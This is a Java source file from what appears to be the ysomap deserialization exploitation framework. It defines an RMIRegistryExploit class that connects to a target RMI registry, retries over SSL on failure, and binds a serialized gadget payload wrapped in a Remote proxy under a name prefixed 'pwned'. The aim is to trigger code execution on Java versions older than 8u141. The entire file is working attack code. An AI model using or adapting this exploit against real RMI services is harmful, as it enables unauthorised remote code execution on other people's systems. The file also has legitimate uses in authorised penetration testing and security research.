package ysomap.core.exploit.rmi;

import ysomap.common.annotation.*;
import ysomap.core.bean.Exploit;
import ysomap.core.exploit.rmi.component.RMISSLClientSocketFactory;
import ysomap.common.util.Logger;
import ysomap.core.util.PayloadHelper;

import java.rmi.ConnectIOException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author wh1t3P1g
 * @since 2020/2/25
 */
@Exploits
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets","RMIConnectWrapped","RMIConnectWrappedWithProxy","RMIConnectWithUnicastRemoteObject"})
@Dependencies({"need set a gadget","before JDK8u141_b10"})
public class RMIRegistryExploit extends Exploit {

    @NotNull
    @Require(name = "target", detail = "target RMI Registry host:port, like localhost:1099")
    public String target;

    @NotNull
    public Object payload;

    public String payloadName;

    @Override
    public void work() {
        try {
            String[] detail = target.split(":");
            if(detail.length == 2){
                Registry registry = LocateRegistry.getRegistry(detail[0], Integer.parseInt(detail[1]));

                // test RMI registry connection and upgrade to SSL connection on fail
                try {
                    registry.list();
                } catch(ConnectIOException ex) {
                    registry = LocateRegistry.getRegistry(detail[0], Integer.parseInt(detail[1]), new RMISSLClientSocketFactory());
                }

                String name = "pwned" + System.nanoTime();
                Remote remote = null;
                if(payload instanceof Remote){
                    remote = (Remote) payload;
                } else{
                    remote = PayloadHelper.createMemoitizedProxy(PayloadHelper.createMap(name, payload), Remote.class);
                }
                try{
                    registry.rebind(name, remote);
                }catch (Throwable e){
                    Logger.error(e.toString());
                }
            }

        } catch (Exception e) {
            Logger.error(e.getMessage());
        }
    }

    @Override
    public void stop() {
        exit = true;
    }

    @Override
    public String toString() {
        return "RMIRegistryExploit{" +
                "target='" + target + '\'' +
                ", payload=" + payloadName +
                '}';
    }

}
